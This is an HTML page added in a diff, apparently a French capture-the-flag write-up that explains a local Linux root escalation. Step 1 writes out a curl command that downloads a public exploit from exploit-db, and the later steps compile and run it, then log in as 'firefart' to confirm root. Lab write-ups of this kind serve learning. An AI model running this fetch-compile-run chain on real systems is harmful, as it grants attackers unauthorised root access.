@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Bonus 3</title>
+	<link rel="stylesheet" type="text/css" href="../scripts/css/bootstrap.min.css">
+	<link rel="stylesheet" type="text/css" href="../scripts/css/style.css">
+</head>
+<body>
+	<nav class="navbar navbar-expand-lg navbar-dark bg-primary">
+		<a class="navbar-brand" href="#">Bonus 3</a>
+		<ul class="navbar-nav mr-auto">
+			<li class="nav-item">
+				<a class="nav-link" href="../writeupindex.html">retour</a>
+			</li>
+		</ul>
+	</nav>
+	<div align="center">
+		<h1 class="mt-4">Bonus 3</h1>
+
+		<div class="mt-5">
+			<h5 class="mt-4">Etape 1 : </h5>
+			<p class="lead">Lancer commande: curl -O https://www.exploit-db.com/download/40839</p>
+			<img src="../scripts/img/bonus3/etape1.png" class="mt-4 om">
+		</div>
+
+		<div class="mt-5">
+			<h5 class="mt-4">Etape 2 : </h5>
+			<p class="lead">On va modifier les droits de ce que l'on vient de télécharger et sont nom en lui ajoutant l'extension .c puis on compile notre fichier .c avec les flag -pthread -lcrypt</p>
+			<img src="../scripts/img/bonus3/etape2.png" class="mt-4 img_sh">
+		</div>
+
+		<div class="mt-5">
+			<h5 class="mt-4">Etape 3 : </h5>
+			<p class="lead"> On execute le binaire</p>
+			<img src="../scripts/img/bonus3/etape3.png" class="mt-4 om">
+		</div>
+
+		<div class="mt-5">
+			<h5 class="mt-4">Etape 4 : </h5>
+			<p class="lead">On se connecte en tant que firefart puis on lance la commande id pour verifier que l'on est bien root</p>
+			<img src="../scripts/img/bonus3/etape4.png" class="mt-4 om">
+		</div>
+	</div>
+	<br><br><br>
+</body>
+</html>
